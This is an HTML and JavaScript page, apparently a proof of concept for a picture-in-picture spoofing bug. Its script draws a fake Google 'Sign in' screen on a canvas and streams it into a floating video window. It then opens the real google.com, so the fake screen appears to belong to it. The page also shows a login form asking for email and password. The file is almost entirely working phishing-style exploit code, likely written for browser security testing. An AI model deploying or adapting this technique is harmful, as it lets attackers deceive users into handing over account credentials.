<html><head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
html { font-family: sans-serif; }
body {
    overscroll-behavior: contain;
}
#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
#canvasElem { display: none; }
.hide {
    display: none;
}
</style>
</head>
<body>
<div id="startContent">
<h1>spoof pip</h1>
<p id="instructions">double click</p>
</div>
<div id="spoofContent" class="hide">
<h1>Spoooo👻oooof</h1>
<p><b>(ooh, scary!)</b></p>
<p><i>A wild login form has appeared!</i></p>
<h2>You must login to continue</h2>
<form action="/?form" method="get">
    <input id="inputElem" name="email" placeholder="Email">
    <br>
    <input name="password" placeholder="Password" type="password">
    <input type="submit">
</form>
<a href="/?forgotpassword">Forgot password?</a>
</div>
<canvas id="canvasElem" width="1000" height="500"></canvas>
<script>
var spoofUrl = 'https://www.google.com/';

var delayToWaitForScroll = 1500;

var newWin;

var pipWindow;

var targetWidth = 1000;
var targetHeight = 500;

var drawCanvas = (text) => {
    const ctx = canvasElem.getContext('2d');
    canvasElem.width = targetWidth;
    canvasElem.height = targetHeight;

    ctx.fillStyle = `#fff`;
    ctx.fillRect(0, 0, targetWidth, targetHeight);

    if (text === '' || text === 'google') {
        // Draw Google Sign-in Mockup
        ctx.font = '500 70px Arial, sans-serif';
        ctx.fillStyle = '#4285F4'; ctx.fillText('G', 400, 120);
        ctx.fillStyle = '#EA4335'; ctx.fillText('o', 455, 120);
        ctx.fillStyle = '#FBBC05'; ctx.fillText('o', 495, 120);
        ctx.fillStyle = '#4285F4'; ctx.fillText('g', 535, 120);
        ctx.fillStyle = '#34A853'; ctx.fillText('l', 575, 120);
        ctx.fillStyle = '#EA4335'; ctx.fillText('e', 595, 120);

        ctx.font = '400 36px Arial, sans-serif';
        ctx.fillStyle = '#202124';
        ctx.fillText('Sign in', 445, 180);

        ctx.font = '400 24px Arial, sans-serif';
        ctx.fillText('Use your Google Account', 365, 230);

        // Input field
        ctx.strokeStyle = '#dadce0';
        ctx.lineWidth = 2;
        ctx.strokeRect(280, 280, 440, 60);
        ctx.font = '24px Arial, sans-serif';
        ctx.fillStyle = '#80868b';
        ctx.fillText('Email or phone', 300, 318);

        // Button
        ctx.fillStyle = '#1a73e8';
        ctx.fillRect(600, 390, 120, 50);
        ctx.fillStyle = '#fff';
        ctx.font = 'bold 20px Arial, sans-serif';
        ctx.fillText('Next', 635, 422);
    } else {
        ctx.fillStyle = '#000';
        var fontSize;
        if (text.length == 1) {
            // Single character
            fontSize = 400;
            ctx.font = fontSize+'px sans-serif';
            ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
        } else if (text.length > 1) {
            var lines = text.split('\n');
            if (lines.length === 2) {
                fontSize = 150;
                ctx.font = fontSize+'px sans-serif';
                ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
                ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
            } else {
                fontSize = 170;
                ctx.font = fontSize+'px sans-serif';
                ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
            }
        }
    }
  }

var createVideo = (canvasElem) => {
    const video = document.createElement('video');
    video.muted = true;
    video.srcObject = canvasElem.captureStream(30);
    video.play();
    return video;
}

var videoElem = createVideo(canvasElem);

var showingPiP = false;
videoElem.addEventListener('enterpictureinpicture', function(event) {
    showingPiP = true;
    instructions.innerText = 'Tap again to continue';
});

// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
drawCanvas('');

var replaceContents = () => {
    startContent.classList.add('hide');
    spoofContent.classList.remove('hide');
}

var ran = false;

window.addEventListener('click', () => {
    if (!showingPiP) {
        videoElem.requestPictureInPicture();
        return;
    }
    if (ran) {
        return;
    }
    ran = true;
    newWin = window.open(spoofUrl, 'ao_spoof_test');
drawCanvas('');

});
</script>


</body></html>
